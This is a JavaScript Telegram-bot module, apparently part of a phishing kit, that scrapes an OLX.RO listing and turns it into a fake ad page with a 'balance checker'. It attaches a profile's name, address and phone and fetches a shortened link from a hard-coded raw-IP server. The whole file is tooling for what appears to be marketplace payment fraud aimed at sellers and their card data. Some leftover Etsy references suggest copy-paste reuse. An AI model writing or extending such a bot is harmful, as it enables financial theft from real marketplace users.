const WizardScene = require("telegraf/scenes/wizard");
const { Request, Ad, Service,MyDomains,Profiles } = require("../../database");
const locale = require("../../locale");
const escapeHTML = require("escape-html");
const { Markup } = require("telegraf");
const log = require("../../helpers/log");
const cheerio = require("cheerio");
const { default: axios } = require("axios");
const rand = require("../../helpers/rand");
const myAd = require("../../commands/myAd");

const olx_ro_domains = ["www.olx.ro", "m.olx.ro", "olx.ro"];

const scene = new WizardScene(
  "create_link_olx_ro",
  async (ctx) => {
    try {
      ctx.scene.state.data = {};
      log(ctx, "перешёл к созданию ссылки OLX.RO");
      // Ask the user whether they want to create a link with or without a parser
      await ctx.scene.reply("Выберите способ создания ссылки", {
        reply_markup: Markup.inlineKeyboard([
          [
            Markup.callbackButton("Atom Parser", "createFileLinkAtomOlx"),
            Markup.callbackButton("Обычное создание", "without_parser"),
          ],
          // [Markup.urlButton("🔑 API", "https://telegra.ph/ETSY-API-01-11")],

          [Markup.callbackButton("Отменить", "cancel")],
        ]),
      });
      return ctx.wizard.next(); // Move to the next step
    } catch (err) {
      console.log(err);
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      // Check the user's choice (with parser or without parser)
      if (ctx.callbackQuery?.data === "createFileLinkAtomOlx") {
        // User selected to create a link with a parser
        return ctx.scene.enter("createFileLinkAtomOlx");
      } else if (ctx.callbackQuery?.data === "without_parser") {
        // User selected to create a link without a parser
      } else {
        // User didn't select a valid option, go back to the previous step
        return ctx.wizard.prevStep();
      }
      const service = await Service.findOne({
        where: {
          code: "etsy_eu",
        },
      });
      if (!service) {
        await ctx.scene.reply("❌ Сервис не существует").catch((err) => err);
        return ctx.scene.leave();
      }
      ctx.scene.state.data = {};
      log(ctx, "перешёл к созданию ссылки ETSY");
      return ctx.wizard.nextStep();
    } catch (err) {
      console.log(err);
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      const service = await Service.findOne({
        where: {
          code: "olx_ro",
        },
      });
      if (!service) {
        await ctx.scene.reply("❌ Сервис не существует").catch((err) => err);
        return ctx.scene.leave();
      }
      log(ctx, "перешёл к созданию ссылки OLX.RO");
      return ctx.wizard.nextStep();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      await ctx.scene.reply("Отправьте ссылку на объявление OLX.RO", {
        reply_markup: Markup.inlineKeyboard([
          [Markup.callbackButton("Отменить", "cancel")],
        ]),
      });
      ctx.scene.state.data = {};
      return ctx.wizard.next();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      if (!ctx.message.text) return ctx.wizard.prevStep();
      var url;
      try {
        url = new URL(ctx.message.text);
      } catch (err) {
        await ctx.replyOrEdit("❌ Введите валидную ссылку").catch((err) => err);
        return ctx.wizard.prevStep();
      }
      if (!olx_ro_domains.includes(url.host)) {
        await ctx
          .replyOrEdit("❌ Введите ссылку на объявление OLX.RO")
          .catch((err) => err);
        return ctx.wizard.prevStep();
      }
      url.host = url.host
        .replace("m.olx.ro", "olx.ro")
        .replace("olx.ro/oferta", "olx.ro/d/oferta");
      url.hostname = url.host;

      log(ctx, `отправил ссылку для парсинга OLX.RO (${url.href})`);

      await ctx.scene.reply("🔄 Парсим объявление...").catch((err) => err);
      const ad = await axios.get(encodeURI(url.href)),
        $ = cheerio.load(ad.data);

        const info = {
          title: $(".css-1dcem4b").text().trim(),
          price: $(".css-1m6jpd2").text().trim(),
          adLink: url.href,
        };
        try {
          info.photo = $(".swiper-zoom-container img").first().attr("src");
        } catch (err) {}
      console.log(info)

      if (!info.title || !info.price) {
        await ctx.scene
          .reply("❌ Не удалось спарсить объявление")
          .catch((err) => err);
        return ctx.scene.leave();
      }
      log(ctx, `спарсил объявление OLX.RO (${url.href})`);

      ctx.scene.state.data = info;

    
 
      const profiles = await Profiles.findAll({where: {userId: ctx.from.id}})

      var buttons = profiles.map((v) => [
        Markup.callbackButton(v.title, v.id)
      ])

      await ctx.scene
      .reply(`Выберите профиль`, {
        reply_markup: Markup.inlineKeyboard([
          ...buttons,
          [Markup.callbackButton("Отменить", "cancel")],
        ])
      })
      return ctx.wizard.next()
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    } 
  },
  async (ctx) => {
    try {
      const profiles = await Profiles.findOne({where: {id: ctx.callbackQuery.data}})
      
      ctx.scene.state.data.address = profiles.address
      ctx.scene.state.data.name = profiles.name
      ctx.scene.state.data.phone = profiles.phone
      await ctx.scene
        .reply("Чекер баланса", {
          reply_markup: Markup.inlineKeyboard([
            [
              Markup.callbackButton("Включить", "true"),
              Markup.callbackButton("Выключить", "false"),
            ],
            [Markup.callbackButton("Отменить", "cancel")],
          ]),
        })
        .catch((err) => err);
      return ctx.wizard.next();
    } catch (err) {
      console.log(err)
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      if (!["true", "false"].includes(ctx.callbackQuery.data)) return ctx.wizard.prevStep();
      ctx.scene.state.data.balanceChecker = ctx.callbackQuery.data == "true";
      return ctx.wizard.nextStep()
    } catch (err) {
      console.log(err)
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      const service = await Service.findOne({
        where: {
          code: "olx_ro",
        },
      });
      if (!service) {
        await ctx.scene.reply("❌ Сервис не существует").catch((err) => err);
        return ctx.scene.leave();
      }
      const ad = await Ad.create({
        id: parseInt(rand(999999, 99999999) + new Date().getTime() / 10000),
        userId: ctx.from.id,
        ...ctx.scene.state.data,
        serviceCode: "olx_ro",
      });
      const domains = await MyDomains.findOne({ 
        where: { userId: ctx.from.id }, 
      }); 
       
      let reductionUrl; 
       
      try { 
        const reduction = await axios.post( 
          "http://185.208.158.144/api/create", 
          { 
            target: `https://${service.domain}/${ad.id}`, 
            domain: service.shortlink || ctx.state.bot.shortlink, 
          }, 
          { timeout: 2000 } 
        ); 
       
        reductionUrl = reduction.data.url; 
      } catch (error) { 
        console.error("Ошибка при создании сокращенной ссылки:", error.message); 
       
        if (error.code === 'ECONNABORTED') { 
          console.warn("Запрос превысил допустимый тайм-аут."); 
        } else if (error.code === 'ECONNREFUSED' || error.code === 'ENOTFOUND') { 
          console.warn("Сервер сокращений недоступен."); 
        } else { 
          console.warn("Произошла непредвиденная ошибка:", error.message); 
        } 
       
        reductionUrl = null; // корректный fallback 
      } 
       
      const personalDomainLink = domains ? `https://${domains.domain}/${ad.id}` : null; 
       
      await ad.update({ 
        myDomainLink: personalDomainLink, 
        shortLink: reductionUrl, // используем переменную 
      }); 
       
log(ctx, `создал объявление ${service.title} <code>(ID: ${ad.id})</code>`); 

// Собираем сообщение 
try {
  await myAd(ctx, ad.id);
} catch (err) {
  await ctx.replyOrEdit("❌ Ошибка при отображении объявления.").catch(() => {});
}
      ctx.updateType = "message";
      return ctx.scene.leave();
    } catch (err) {
      console.log(err);
    }
  }
);

module.exports = scene;
